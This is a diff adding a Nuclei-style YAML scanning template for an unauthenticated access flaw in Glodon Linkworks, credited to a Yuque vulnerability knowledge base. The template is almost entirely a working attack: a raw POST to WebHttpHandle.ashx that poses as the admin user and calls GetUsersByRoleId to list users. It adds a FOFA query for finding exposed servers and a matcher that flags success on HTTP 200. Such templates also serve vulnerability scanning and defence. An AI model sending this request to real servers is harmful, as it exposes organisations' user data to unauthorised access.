@@ -1,0 +1,30 @@
+id: poc-fk5w80bfoqgtdwgh
+info:
+  name: 广联达-Linkworks webhttphandle 未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fk5w80bfoqgtdwgh'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fk5w80bfoqgtdwgh
+    fofa: body="/Services/Identification/login.ashx"
+http:
+- raw:
+  - 'POST /org/WebHttpHandle.ashx?FromNetCore=TRUE&UserID=0&UserCode=admin HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: close
+
+    Cookie:
+
+    Content-Type: application/json; charset=utf-8
+
+
+    {"controller":"GTP.Org.Action.RoleCacheUserService","action":"GetUsersByRoleId","args":[1001]}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
